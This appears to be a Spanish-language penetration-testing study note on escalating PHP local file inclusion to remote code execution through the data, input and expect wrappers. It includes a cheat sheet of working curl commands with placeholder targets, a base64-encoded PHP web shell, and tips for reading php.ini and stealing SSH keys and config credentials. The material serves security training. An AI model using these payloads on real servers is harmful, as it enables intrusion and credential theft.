---
tags:
  - webapp
  - RCE
  - LFI
---
## Conceptos Clave (TL;DR)

* Las vulnerabilidades de Local File Inclusion (LFI) pueden escalar a Remote Code Execution (RCE) utilizando wrappers específicos de PHP para ejecutar código en el servidor backend.

* Alternativamente al RCE directo, el LFI puede usarse para extraer credenciales reutilizadas desde archivos como `config.php` o robar claves privadas SSH (`id_rsa`) de directorios `.ssh` con permisos incorrectos.

* Los wrappers `data` e `input` requieren estrictamente que la directiva `allow_url_include` esté configurada como `On` en el entorno PHP.

* El wrapper `expect` permite ejecutar comandos nativos del sistema directamente a través de la URL, pero es una extensión externa que no viene habilitada por defecto.
  

## Herramientas Clave

* **cURL / Burp Suite:** Herramientas necesarias para capturar de forma íntegra outputs muy largos (como archivos `.ini` en base64) o enviar payloads específicos que podrían corromperse en un navegador estándar.

* **Filtros base64 de PHP:** Utilizados (`convert.base64-encode`) junto con el LFI para leer archivos de configuración o enviar payloads (web shells) codificados, evitando errores de sintaxis que rompan la ejecución.
  

## Metodología Paso a Paso

**Fase 1: Enumeración y Lectura de Configuraciones (php.ini)**

El primer paso lógico es confirmar las capacidades del servidor leyendo el archivo `php.ini`. Se debe utilizar un filtro base64 para exfiltrar el archivo sin que el servidor interprete o rompa su contenido. Posteriormente, se decodifica localmente para buscar directivas habilitadas como `allow_url_include` o la extensión `expect`.

  

**Fase 2: RCE mediante Wrapper 'data'**

Si la enumeración revela que `allow_url_include` está activada, se procede a crear una web shell básica en PHP y codificarla en base64. Este payload se pasa directamente a la URL utilizando la estructura `data://text/plain;base64,`, permitiendo al servidor decodificar y ejecutar la shell inyectada.

  

**Fase 3: RCE mediante Wrapper 'input'**

Funciona bajo el mismo requisito (`allow_url_include = On`), pero la vía de inyección cambia. En lugar de enviar la shell codificada por la URL, se envía el código PHP puro como la "data" del cuerpo de una petición HTTP POST. El comando a ejecutar suele enviarse por GET.

  

**Fase 4: RCE mediante Wrapper 'expect'**

Si se identifica que el servidor tiene la extensión instalada, se prescinde de inyectar una web shell. Se envía el comando del sistema operativo directamente como parámetro del wrapper en la URL (ej. `expect://id`), logrando ejecución inmediata.

  
## Cheat Sheet de Comandos

```bash
# 1. Leer php.ini a traves del LFI usando filtro base64 para evitar corrupcion de formato.

# Cambiar <PHP_VERSION> por la version instalada (ej. 7.4, 8.1) y probar 'fpm' si 'apache2' no existe.

curl -s "http://<TARGET_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/<PHP_VERSION>/apache2/php.ini"
```
  
```bash
# 2. Decodificar la respuesta del archivo de configuracion y filtrar para comprobar si allow_url_include esta habilitado.

echo '<BASE64_STRING_FROM_PREVIOUS_CMD>' | base64 -d | grep allow_url_include
```
  
```bash
# 3. Generar un payload en base64 de una web shell basica en PHP para el wrapper data.

echo '<?php system($_GET["cmd"]); ?>' | base64
# PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```
  
```bash
# 4. Explotar RCE usando el wrapper 'data'. El payload base64 debe estar URL-encoded.

# Se usa &cmd= para pasar el comando a ejecutar a la web shell inyectada.

curl -s 'http://<TARGET_IP>:<PORT>/index.php?language=data://text/plain;base64,<URL_ENCODED_BASE64_PAYLOAD>&cmd=<COMMAND>'
```
  
```bash
# 5. Explotar RCE usando el wrapper 'input'.

# -X POST define el verbo. --data contiene la web shell directa. El comando va en la URL.

curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<TARGET_IP>:<PORT>/index.php?language=php://input&cmd=<COMMAND>"
```
  
```bash
# 6. Decodificar la configuracion y filtrar para buscar si la extension 'expect' esta presente.

echo '<BASE64_STRING>' | base64 -d | grep expect
```
  
```bash
# 7. Explotar RCE directo usando el wrapper 'expect', pasando el comando inmediatamente despues de los dos puntos.

curl -s "http://<TARGET_IP>:<PORT>/index.php?language=expect://<COMMAND>"
```

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`file_get_contents()`|✅|❌|✅|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`@Html.RemotePartial()`|✅|❌|✅|
|`include`|✅|✅|✅|

## "Gotchas" y Troubleshooting

* **Ubicaciones comunes de php.ini:** Si no encuentras el archivo en `/etc/php/<VERSION>/apache2/php.ini` (para Apache), busca en `/etc/php/<VERSION>/fpm/php.ini` (para Nginx). Comienza enumerando la versión más reciente y ve retrocediendo.

* **Por defecto deshabilitado:** La opción `allow_url_include` suele estar desactivada por defecto en PHP moderno, pero es común encontrarla encendida debido a los requisitos de ciertos plugins o temas de WordPress.

* **Restricciones del wrapper input:** El parámetro vulnerable debe aceptar peticiones POST obligatoriamente. Si la función vulnerable no captura variables GET (no usa `$_REQUEST`), no podrás pasar los comandos por la URL (`&cmd=`). En ese caso, debes codificar el comando de forma estática dentro del cuerpo POST (ej. `<?php system('id')?>`).

* **Falso positivo con expect:** Encontrar `extension=expect` en la configuración solo indica que el servidor intenta cargarlo. Puede fallar en tiempo de ejecución por muchas razones, por lo que la única forma real de confirmarlo es intentando ejecutar un comando directamente.

* **Sinergia:** El wrapper `expect` también es un vector común en vulnerabilidades XXE, por lo que esta técnica es aplicable más allá de LFI.